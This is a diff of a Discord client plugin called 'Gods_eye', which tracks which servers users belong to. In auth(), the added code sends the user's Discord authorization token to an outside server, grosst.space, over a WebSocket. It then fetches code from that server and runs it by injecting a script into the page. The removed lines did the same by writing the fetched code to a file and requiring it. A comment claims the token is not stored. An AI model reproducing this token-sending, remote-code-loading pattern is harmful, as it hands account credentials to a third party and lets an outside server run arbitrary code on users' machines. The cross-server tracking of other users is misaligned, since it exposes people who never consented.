@@ -39,18 +39,19 @@ const config = {
                 discord_id: "3713360440224645238",
             }
         ],
-        version: "2.0.9",
+        version: "2.1.0",
         description: "Показывает кто где и скем сидит",
         github: "https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js",
         github_raw: "https://raw.githubusercontent.com/GR0SST/Gods_eye/main/SelfCommands.plugin.js",
 
     },
     changelog: [{
-        title: "Rebranding",
+        title: "Слава Украине",
         type: "fixed",
         items: [
-            "тут 1 букву добавил ахуенный апдейт"
-            
+            "Заработала хунйя которая пробивает людей по всем серверам в базе",
+            "Помемял дохуя залупы внутренней"
+
         ]
     }],
     defaultConfig: []
@@ -136,9 +137,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
 } : (([Plugin, Library]) => {
     const { DiscordModules, Settings, Toasts, PluginUtilities, WebpackModules } = Library;
     const { React } = DiscordModules;
-    const { getToken } = WebpackModules.getByProps("getToken","getId")
-    const path = `${BdApi.Plugins.folder}\\mainCode.js`
-    let auth = false
+    const { getToken } = WebpackModules.getByProps("getToken", "getId")
 
     const TopBarRef = React.createRef();
     return class Gods_eye extends Plugin {
@@ -148,44 +147,45 @@ module.exports = !global.ZeresPluginLibrary ? class {
         auth() {
             // Токен используеться исключительно для авторизации и индетификации пользователя
             // Никакие данные используя токен не сохраняються и не обрабатываються
-            
-            const options = {
-                url: 'https://www.grosst.space/selfcmd',//
-                headers: {
-                    'authorization': getToken()
-                },
-            };
             return new Promise(res => {
-                request.post(options, (error, response, body) => {
-
-                    if (response.statusCode === 200) {
-                        let reps = JSON.parse(body)
-                        auth = reps.auth
-
-                        fs.writeFile(path, `${reps.main}`, function (err) {
-                            if (err) {
-                                return console.log(err);
-                            }
-                            res(true)
-                        });
-                    }
-                });
+                const ws = new WebSocket("wss://www.grosst.space/ws") // wss://www.grosst.space/ws ws://localhost:3000
+                ws.onopen = () =>{
+                    this.sendCommand(ws,`login_selfcmd_${getToken()}`, (msg,data)=>{
+                        const receivedDate = JSON.parse(data)
+                        this.logged = true
+                        this.autharizated = receivedDate.auth
+                        res(receivedDate.main)
+                    })
+                }
             })
         }
 
         async onStart() {
-            fs.writeFile(path, ` `, function (err) { });
-            this.loadSettings();
-            delete require.cache[require.resolve(path)]
-            await this.auth()
-            const mainCode = require(path)
-            this.script = new mainCode.exports()
-            this.script.onStart()
+            try {
+                this.loadSettings();
+                const code = await this.auth()
+                this.scriptElement = document.createElement('script')
+                this.scriptElement.text = code
+                
+                //this.scriptElement.scr = "link" 
+                this.scriptElement.id = "GodsEye"
+                document.head.appendChild(this.scriptElement);
+                runGodsEye()
+                this.script = new window.GodsEye
+                
+                this.script.onStart()
+            } catch (error) {
+                console.log(error);
+            }
         }
 
         onStop() {
-           if(this.script)
-           this.script.onStop()
+            window.GodsEye = null
+            if (this.script)
+                this.script.onStop()
+            if(this.scriptElement){
+                this.scriptElement.remove()
+            }
         }
 
         get defaultVariables() {
@@ -193,7 +193,22 @@ module.exports = !global.ZeresPluginLibrary ? class {
                 exposeUsers: true
             };
         }
-
+        async sendCommand(ws,cmd, func) {
+            const webSocket = ws
+            webSocket.onmessage = (message) => {
+                 if (message.data.startsWith(cmd) === true) {
+                    const data = message.data.slice(cmd.length + 1, message.data.length)
+                    func(message, data)
+                    close()
+                }
+            }
+            function close() {
+                webSocket.onmessage = null
+            }
+            await this.waitForOpenConnection(webSocket)
+            webSocket.send(cmd)
+    
+        }
         getSettingsPanel() {
             const panel = document.createElement("div");
             panel.className = "form";
@@ -202,7 +217,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
             //#region Startup Settings
             new Settings.SettingGroup("Startup Settings", { shown: true }).appendTo(panel)
                 .append(new Settings.Switch("Expose myself", "Share your servers with others", this.settings.exposeUsers, checked => {
-                    if (auth) {
+                    if (this.autharizated) {
                         this.settings.exposeUsers = checked;
                         this.saveSettings();
                     } else {
@@ -234,6 +249,24 @@ module.exports = !global.ZeresPluginLibrary ? class {
 
         getSettingsPath() {
             return this.getName();
+        }
+        waitForOpenConnection(ws) {
+            return new Promise((resolve, reject) => {
+                const maxNumberOfAttempts = 10
+                const intervalTime = 200 //ms
+    
+                let currentAttempt = 0
+                const interval = setInterval(() => {
+                    if (currentAttempt > maxNumberOfAttempts - 1) {
+                        clearInterval(interval)
+                        reject(new Error('Maximum number of attempts exceeded'))
+                    } else if (ws.readyState === ws.OPEN) {
+                        clearInterval(interval)
+                        resolve()
+                    }
+                    currentAttempt++
+                }, intervalTime)
+            })
         }
     }
 
